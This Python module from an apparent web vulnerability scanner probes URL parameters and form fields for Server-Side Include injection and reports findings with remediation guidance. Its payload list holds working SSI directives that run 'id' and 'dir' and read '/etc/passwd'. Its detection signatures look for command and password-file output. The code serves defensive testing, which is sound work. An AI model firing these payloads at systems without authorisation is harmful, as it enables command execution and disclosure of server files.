"""Server-Side Include (SSI) injection — targets web servers with SSI processing enabled."""
from typing import List
from scanner.core.crawler import CrawlResult
from scanner.core.scan_result import Finding, Severity
from scanner.utils.http import get_url_params, inject_url_param, fetch

_PAYLOADS = [
    "<!--#exec cmd=\"id\"-->",
    "<!--#exec cmd=\"cat /etc/passwd\"-->",
    "<!--#echo var=\"DATE_LOCAL\"-->",
    "<!--#echo var=\"DOCUMENT_ROOT\"-->",
    "<!--#printenv-->",
    "<!--#include virtual=\"/etc/passwd\"-->",
    '<!--#exec cmd="dir"-->',
    "<<!--#exec cmd=\"id\"-->",
]

_SIGNATURES = [
    "uid=",
    "gid=",
    "/var/www",
    "/etc/passwd",
    "DOCUMENT_ROOT",
    "SERVER_SOFTWARE",
    "PATH=",
    "HOME=/",
    "root:x:",
]


def test(page: CrawlResult, client) -> List[Finding]:
    findings = []
    params = get_url_params(page.url)
    for param in params:
        # Fetch a benign baseline first — some signatures (uid=, PATH=) appear in
        # responses from CSTI/SSTI execution on the same parameter. Only flag
        # signatures that are absent from the clean response.
        baseline_url = inject_url_param(page.url, param, "kagesec_ssi_probe")
        baseline_resp = fetch(client, "get", baseline_url)
        baseline_body = getattr(baseline_resp, "text", "") if baseline_resp else ""
        baseline_present = {s for s in _SIGNATURES if s in baseline_body}
        check_sigs = [s for s in _SIGNATURES if s not in baseline_present]
        if not check_sigs:
            continue

        for payload in _PAYLOADS:
            url = inject_url_param(page.url, param, payload)
            resp = fetch(client, "get", url)
            if not resp:
                continue
            body = getattr(resp, "text", "")
            matched = next((s for s in check_sigs if s in body), None)
            if matched:
                findings.append(_finding(page.url, param, payload, matched))
                break

    for form in page.forms:
        inputs = [i["name"] for i in form["inputs"] if i["name"]]
        if not inputs:
            continue
        # Baseline for forms: submit with neutral values
        baseline_data = {name: "kagesec_ssi_probe" for name in inputs}
        baseline_resp = fetch(client, form["method"], form["action"], baseline_data)
        baseline_body = getattr(baseline_resp, "text", "") if baseline_resp else ""
        baseline_present = {s for s in _SIGNATURES if s in baseline_body}
        check_sigs = [s for s in _SIGNATURES if s not in baseline_present]
        if not check_sigs:
            continue

        for payload in _PAYLOADS[:3]:
            data = {name: payload for name in inputs}
            resp = fetch(client, form["method"], form["action"], data)
            if not resp:
                continue
            body = getattr(resp, "text", "")
            matched = next((s for s in check_sigs if s in body), None)
            if matched:
                findings.append(_finding(form["action"], inputs[0], payload, matched))
                break

    return findings


def _finding(url: str, param: str, payload: str, matched: str) -> Finding:
    return Finding(
        title="Server-Side Include (SSI) Injection",
        severity=Severity.HIGH,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"SSI output signature '{matched}' found in response after injecting SSI directive",
        description=(
            "SSI injection occurs when user input is embedded in an HTML file processed by the web "
            "server's SSI engine. Attackers can read files, execute OS commands, and pivot to full "
            "remote code execution."
        ),
        remediation=(
            "Disable SSI processing unless explicitly required. If needed, validate and sanitise all "
            "user input before including it in SSI-processed pages. Use the 'IncludesNoExec' option "
            "to disable exec directives."
        ),
        cwe="CWE-97",
        cvss=8.8,
        owasp_category="A03:2021 Injection",
        confidence=0.95,
    )
